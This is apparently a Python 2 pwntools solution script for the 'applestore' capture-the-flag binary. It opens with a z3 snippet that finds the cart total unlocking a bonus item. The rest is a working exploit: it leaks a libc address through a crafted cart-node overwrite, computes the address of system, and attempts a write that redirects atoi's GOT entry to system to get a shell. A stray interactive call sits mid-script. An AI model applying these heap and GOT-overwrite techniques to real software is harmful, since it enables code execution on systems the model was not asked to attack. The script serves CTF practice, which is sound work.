"""
from z3 import *

p = [199, 299, 499, 399, 199]
x =[]
s = Solver()
for i in range(len(p)):
	v = Int('x{}'.format(i))
	s.add(v >= 0)
	x.append(v*p[i])
s.add(sum(x) == 0x1C06)
if s.check():
	print s.model()

# [x3 = 0, x2 = 0, x1 = 20, x4 = 0, x0 = 6]
"""

from pwn import *

io = process("./applestore")
e = ELF("./applestore")
l = ELF("/lib32/libc-2.27.so")

def choose(i):
	if type(i) == int:
		io.sendlineafter("> ", str(i))
	elif type(i) == str:
		io.sendafter("> ", i)
def yes():
	io.sendlineafter("Let me check your cart. ok? (y/n)", "y")
def addItem(i):
	choose(2)
	io.sendlineafter("Device Number> ", str(i))
for i in range(6):
	addItem(1)
for i in range(20):
	addItem(2)

# how to leak libc
"""
0x0804b034 0x00002034 SET_32  __libc_start_main
0x0804b038 0x00002038 SET_32  memset
"""

choose(5)
yes()
choose(p32(0x0804b034) + 'A'*4 + '\x00'*8) # choose 4, kind of coincidence ?
io.interactive()
yes()

io.recvuntil("28: ")
start_m_at = u32(io.recv(4))
system_at = start_m_at - l.symbols['__libc_start_main'] + l.symbols['system']
print "start_m_at: {}".format(hex(start_m_at))
print "system_at: {}".format(hex(system_at))

# where to write, write what ?
choose(p32(0x0804b033) + '\x00'*4 + p32(e.got['atoi'] - 0xC) + p32(system_at))	# next -> pre = pre

